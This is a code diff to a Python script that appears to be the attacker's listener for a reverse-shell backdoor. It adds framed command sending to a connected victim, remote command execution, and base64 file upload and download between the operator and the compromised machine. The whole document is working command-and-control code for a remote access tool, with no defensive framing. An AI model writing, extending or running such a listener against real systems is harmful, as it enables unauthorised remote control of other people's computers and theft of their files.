@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, argparse
+import socket, argparse, json, base64
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -27,14 +27,51 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Connected from " + str(address) + ".")
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+        return self.reliable_receive()
+
+    def write_file(self, path, content):
+        with open(path, "wb") as download_file:
+            download_file.write(base64.b64decode(content))
+        return "[+] File " + path + " Saved."
+
+    def read_file(self, path):
+        with open(path, "rb") as upload_file:
+            return base64.b64encode(upload_file.read())
 
     def run(self):
         while True:
             command = raw_input("-[ ")
-            result = self.execute_remotely(command)
+            command = command.split(" ")
+
+            try:
+                if command[0] == "upload":
+                    content = self.read_file(command[1])
+                    command.append(content)
+                result = self.execute_remotely(command)
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution."
             print(result)
 
 options = get_arguments()
